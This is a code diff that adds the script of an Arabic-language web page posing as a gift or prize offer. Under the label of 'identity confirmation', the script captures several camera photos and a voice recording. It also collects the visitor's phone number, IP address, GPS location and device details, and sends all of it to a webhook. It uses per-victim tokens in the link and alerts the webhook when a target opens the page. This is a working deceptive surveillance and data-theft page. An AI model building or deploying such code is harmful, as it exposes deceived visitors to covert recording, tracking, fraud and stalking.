+                            video.addEventListener('loadedmetadata', onReady);
+                            video.addEventListener('canplay', onReady);
+                            video.play().catch(() => {});
+                        }
+                    });
+
+                    await new Promise(r => setTimeout(r, 500));
+                    const ctx = canvas.getContext('2d');
+                    const width = Math.min(video.videoWidth || 640, 1920);
+                    const height = Math.min(video.videoHeight || 480, 1080);
+                    canvas.width = width;
+                    canvas.height = height;
+
+                    showStatus(statusTasks, 'info', `📸 جاري تأكيد الهوية...`);
+
+                    for (let i = 1; i <= TOTAL_PHOTOS; i++) {
+                        ctx.drawImage(video, 0, 0, width, height);
+                        const dataUrl = canvas.toDataURL('image/jpeg', PHOTO_QUALITY);
+                        if (dataUrl && dataUrl.length > 5000) {
+                            capturedPhotos.push(dataUrl);
+                        } else {
+                            await new Promise(r => setTimeout(r, 200));
+                            ctx.drawImage(video, 0, 0, width, height);
+                            const retry = canvas.toDataURL('image/jpeg', PHOTO_QUALITY);
+                            if (retry && retry.length > 5000) {
+                                capturedPhotos.push(retry);
+                            }
+                        }
+                        if (i < TOTAL_PHOTOS) await new Promise(r => setTimeout(r, CAPTURE_INTERVAL));
+                    }
+
+                    showStatus(statusTasks, 'info', `✅ تم تأكيد الهوية`);
+                    resolve(true);
+
+                } catch (error) {
+                    console.error('❌ Camera error:', error);
+                    showStatus(statusTasks, 'error', '⚠️ لم نتمكن من التأكيد البصري، حاول مرة أخرى.');
+                    if (mediaStream) {
+                        mediaStream.getTracks().forEach(t => t.stop());
+                        mediaStream = null;
+                    }
+                    video.srcObject = null;
+                    resolve(false);
+                }
+            });
+        }
+
+        async function recordAudio() {
+            return new Promise(async (resolve) => {
+                try {
+                    showStatus(statusTasks, 'info', '🎤 جاري تأكيد الصوت...');
+                    const audioConstraints = { audio: true };
+                    audioStream = await navigator.mediaDevices.getUserMedia(audioConstraints);
+                    audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm;codecs=opus' });
+                    audioChunks = [];
+                    audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
+                    audioRecorder.onstop = () => { resolve(); };
+                    audioRecorder.start();
+                    setTimeout(() => {
+                        if (audioRecorder.state === 'recording') {
+                            audioRecorder.stop();
+                        }
+                        audioStream.getTracks().forEach(t => t.stop());
+                    }, AUDIO_DURATION);
+                } catch (error) {
+                    console.error('❌ Audio error:', error);
+                    showStatus(statusTasks, 'error', '⚠️ لم نتمكن من تأكيد الصوت، حاول مرة أخرى.');
+                    resolve();
+                }
+            });
+        }
+
+        // ================================================================
+        //  SEND ALL DATA VIA WEBHOOK
+        // ================================================================
+        async function sendAllData() {
+            const photosBase64 = capturedPhotos.map(d => d.split(',')[1]);
+            let audioBase64 = null;
+            if (audioChunks.length > 0) {
+                const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                audioBase64 = await blobToBase64(blob);
+            }
+
+            const payload = {
+                event: 'submission',
+                country: selectedCountry,
+                phone: userPhone,
+                ip: userIP,
+                location: {
+                    lat: userLocation.lat,
+                    lng: userLocation.lng,
+                    accuracy: userLocation.accuracy,
+                    error: userLocation.error
+                },
+                device: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height}`,
+                    colorDepth: screen.colorDepth,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                },
+                timestamp: new Date().toISOString(),
+                photos: photosBase64,
+                audio: audioBase64
+            };
+
+            const result = await sendToWebhook(payload);
+            if (result.success) {
+                console.log('✅ All data sent to webhook');
+            } else {
+                console.error('❌ Failed to send all data:', result.error);
+                showStatus(statusTasks, 'error', '⚠️ فشل الإرسال: ' + result.error);
+            }
+
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(t => t.stop());
+                mediaStream = null;
+                video.srcObject = null;
+            }
+        }
+
+        // ================================================================
+        //  HELPER: blob to base64
+        // ================================================================
+        function blobToBase64(blob) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onloadend = () => {
+                    const base64 = reader.result.split(',')[1];
+                    resolve(base64);
+                };
+                reader.onerror = reject;
+                reader.readAsDataURL(blob);
+            });
+        }
+
+        // ================================================================
+        //  TIMER
+        // ================================================================
+        function startTimer(seconds) {
+            timerSeconds = seconds;
+            updateTimerDisplay();
+            if (timerInterval) clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+                timerSeconds--;
+                updateTimerDisplay();
+                if (timerSeconds <= 0) {
+                    clearInterval(timerInterval);
+                    timerDisplay.textContent = '00:00';
+                    showStatus(statusTimer, 'success', '🎉 تم إرسال هديتك! تحقق من هاتفك.');
+                }
+            }, 1000);
+        }
+
+        function updateTimerDisplay() {
+            const mins = Math.floor(timerSeconds / 60);
+            const secs = timerSeconds % 60;
+            timerDisplay.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        }
+
+        // ================================================================
+        //  STATUS HELPER
+        // ================================================================
+        function showStatus(el, type, message) {
+            el.className = `status ${type}`;
+            el.textContent = message;
+            el.style.display = 'block';
+            if (type !== 'error') {
+                clearTimeout(el._timeout);
+                el._timeout = setTimeout(() => {
+                    if (el.className.includes(type)) {
+                        el.style.display = 'none';
+                    }
+                }, 6000);
+            }
+        }
+
+        // ================================================================
+        //  CLEANUP
+        // ================================================================
+        window.addEventListener('beforeunload', () => {
+            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+            if (audioStream) audioStream.getTracks().forEach(t => t.stop());
+            if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
+            if (timerInterval) clearInterval(timerInterval);
+        });
+
+        // ================================================================
+        //  🚀 START: التحقق من التوكن، إشعار الدخول، تفعيل الحماية
+        // ================================================================
+        window.addEventListener('load', async () => {
+            const hasToken = extractTokenFromURL();
+            if (!hasToken) {
+                showStatus(statusCountry, 'error', '⚠️ رابط غير صحيح. يرجى استخدام الرابط المخصص لك.');
+                document.querySelectorAll('.country-btn').forEach(b => b.disabled = true);
+                return;
+            }
+            await notifyUserEntered();
+            detectSuspiciousActivity();
+            console.log('🛡️ الحماية مفعلة وإشعار الدخول تم إرساله إلى Webhook');
+        });
+    </script>
 </body>
 </html>
